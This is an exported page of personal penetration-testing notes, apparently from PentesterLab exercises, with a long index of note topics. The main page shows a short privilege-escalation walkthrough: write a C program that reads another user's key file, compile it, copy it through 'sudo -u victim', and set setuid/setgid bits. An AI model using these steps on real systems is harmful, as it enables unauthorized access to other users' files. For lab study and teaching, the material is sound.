<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>C Scripts Priv Esc</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><div class="main"><div class="tree">
<p><strong>Index</strong></p>
<p><a href="Recon_Cycle.html">Recon Cycle</a></p>

<p><a href="What_I'm_Up_to.html">What I'm Up to</a></p>

<p><a href="Interesting_Resources.html">Interesting Resources</a></p>

<ol>
<li><a href="Interesting_Resources--Enumeration_Cheat_Sheet.html">Enumeration Cheat Sheet</a></li>
<li><a href="Interesting_Resources--Writing_Malware_in_Python.html">Writing Malware in Python</a></li>
<li><a href="Interesting_Resources--How_to_utilise_Security_Conference's.html">How to utilise Security Conference's</a></li>
<li><a href="Interesting_Resources--Red_Teaming_Curated_List.html">Red Teaming Curated List</a></li>
<li><a href="Interesting_Resources--Priv_Esc_Cheat_Sheet's.html">Priv Esc Cheat Sheet's</a></li>
<li><a href="Interesting_Resources--Subscription_Courses_Worth_Your_Time.html">Subscription Courses Worth Your Time</a></li>
</ol>
<p><a href="Kali__Linux_Features.html">Kali  Linux Features</a></p>

<ol>
<li><a href="Kali__Linux_Features--ssh.html">ssh</a></li>
<ol>
<li><a href="Kali__Linux_Features--ssh--service_ssh_start.html">service ssh start</a></li>
</ol>
<li><a href="Kali__Linux_Features--apache2.html">apache2</a></li>
<ol>
<li><a href="Kali__Linux_Features--apache2--service_apache2_start.html">service apache2 start</a></li>
</ol>
</ol>
<p><a href="Burpsuite_Pentesting.html">Burpsuite Pentesting</a></p>

<ol>
<li><a href="Burpsuite_Pentesting--Authentication.html">Authentication</a></li>
<ol>
<li><a href="Burpsuite_Pentesting--Authentication--MySQL_Insensitive_Comparison.html">MySQL Insensitive Comparison</a></li>
<li><a href="Burpsuite_Pentesting--Authentication--Analyze_the_Response.html">Analyze the Response</a></li>
</ol>
</ol>
<p><a href="SQL.html">SQL</a></p>

<p><a href="Reporting_Findings.html">Reporting Findings</a></p>

<p><a href="Unix.html">Unix</a></p>

<ol>
<li><a href="Unix--Unix_Commands.html">Unix Commands</a></li>
<ol>
<li><a href="Unix--Unix_Commands--sudo.html">sudo</a></li>
<ol>
<li><a href="Unix--Unix_Commands--sudo---l.html">-l</a></li>
</ol>
<li><a href="Unix--Unix_Commands--top.html">top</a></li>
<li><a href="Unix--Unix_Commands--cd.html">cd</a></li>
<ol>
<li><a href="Unix--Unix_Commands--cd--...html">..</a></li>
</ol>
<li><a href="Unix--Unix_Commands--cat.html">cat</a></li>
<li><a href="Unix--Unix_Commands--ls.html">ls</a></li>
<ol>
<li><a href="Unix--Unix_Commands--ls---a.html">-a</a></li>
<li><a href="Unix--Unix_Commands--ls---lah.html">-lah</a></li>
</ol>
<li><a href="Unix--Unix_Commands--find.html">find</a></li>
<ol>
<li><a href="Unix--Unix_Commands--find---name.html">-name</a></li>
<li><a href="Unix--Unix_Commands--find---exec.html">-exec</a></li>
</ol>
<li><a href="Unix--Unix_Commands--grep.html">grep</a></li>
<li><a href="Unix--Unix_Commands--rm.html">rm</a></li>
<ol>
<li><a href="Unix--Unix_Commands--rm---r.html">-r</a></li>
</ol>
<li><a href="Unix--Unix_Commands--mysql.html">mysql</a></li>
<ol>
<li><a href="Unix--Unix_Commands--mysql---u.html">-u</a></li>
<li><a href="Unix--Unix_Commands--mysql---p.html">-p</a></li>
</ol>
<li><a href="Unix--Unix_Commands--psql.html">psql</a></li>
<ol>
<li><a href="Unix--Unix_Commands--psql---U.html">-U</a></li>
<li><a href="Unix--Unix_Commands--psql---W.html">-W</a></li>
</ol>
<li><a href="Unix--Unix_Commands--strings.html">strings</a></li>
<li><a href="Unix--Unix_Commands--locate.html">locate</a></li>
<li><a href="Unix--Unix_Commands--which.html">which</a></li>
<li><a href="Unix--Unix_Commands--netstat.html">netstat</a></li>
<ol>
<li><a href="Unix--Unix_Commands--netstat---a.html">-a</a></li>
<li><a href="Unix--Unix_Commands--netstat---n.html">-n</a></li>
<li><a href="Unix--Unix_Commands--netstat---t.html">-t</a></li>
<li><a href="Unix--Unix_Commands--netstat---p.html">-p</a></li>
<li><a href="Unix--Unix_Commands--netstat---u.html">-u</a></li>
</ol>
<li><a href="Unix--Unix_Commands--.html">|</a></li>
<li><a href="Unix--Unix_Commands--service.html">service</a></li>
<ol>
<li><a href="Unix--Unix_Commands--service--start.html">start</a></li>
<li><a href="Unix--Unix_Commands--service--stop.html">stop</a></li>
</ol>
<li><a href="Unix--Unix_Commands--update-rc.d.html">update-rc.d</a></li>
<li><a href="Unix--Unix_Commands--C_Scripts_Priv_Esc.html">C Scripts Priv Esc</a></li>
</ol>
<li><a href="Unix--Interesting_files.html">Interesting files</a></li>
<ol>
<li><a href="Unix--Interesting_files--shadow-.shadow_backup.html">shadow/.shadow_backup</a></li>
<li><a href="Unix--Interesting_files--backups.html">backups</a></li>
<li><a href="Unix--Interesting_files--.bashrc.html">.bashrc</a></li>
<ol>
<li><a href="Unix--Interesting_files--.bashrc--.bash_history.html">.bash_history</a></li>
</ol>
</ol>
<li><a href="Unix--SQL.html">SQL</a></li>
<ol>
<li><a href="Unix--SQL--SQL_Commands.html">SQL Commands</a></li>
<ol>
<li><a href="Unix--SQL--SQL_Commands--select__from.html">select * from</a></li>
<li><a href="Unix--SQL--SQL_Commands--LOAD_DATA_INFILE.html">LOAD DATA INFILE</a></li>
<li><a href="Unix--SQL--SQL_Commands--create_table.html">create table</a></li>
<li><a href="Unix--SQL--SQL_Commands--COPY_[table]_from_'[FILENAME]';.html">COPY [table] from '[FILENAME]';</a></li>
</ol>
<li><a href="Unix--SQL--MySQL_Commands.html">MySQL Commands</a></li>
<ol>
<li><a href="Unix--SQL--MySQL_Commands--show.html">show</a></li>
<li><a href="Unix--SQL--MySQL_Commands--use.html">use</a></li>
</ol>
<li><a href="Unix--SQL--PostgreSQL_Commands.html">PostgreSQL Commands</a></li>
<ol>
<li><a href="Unix--SQL--PostgreSQL_Commands---list.html">\list</a></li>
<li><a href="Unix--SQL--PostgreSQL_Commands---c.html">\c</a></li>
<li><a href="Unix--SQL--PostgreSQL_Commands---d.html">\d</a></li>
</ol></ol></ol></div>
<div class="page"><h1><b><u>C Scripts Priv Esc</u></b></h1>You can use “vim script.c” then insert:<br /><br /><code>int main(void)<br />{<br />system("cat /home/victim/key.txt");<br />}<br /><br /></code>then you can press “ESC” to escape insert mode then ":w" and “!” if an ovveride is needed. <br /><br />You can then compile it:<br /><code><br />gcc -o /tmp/[FILE] [FILE].c<br /></code><br />Where <code>[FILE]</code> is the filename.<br />Then you will need to copy it using the <code>sudo -u victim /bin/cp /tmp/[FILE] /tmp/[FILE]</code>, this<br />will allow you to create a file owned by the <code>victim</code><br />user. Once you copied it, you should be able to set the <code>setuid</code> and <code>setgid</code> flags on it using:<br /><code><br />sudo -u victim chmod +xs [FILE]<br /></code><br />Where <code>[FILE]</code> is the filename.<br />Now you can run this program as the <code>pentesterlab</code> and you should be able to get access to the<br /><code>key.txt</code> file thanks to the setgid bit.<br /></div></div>
</body></html>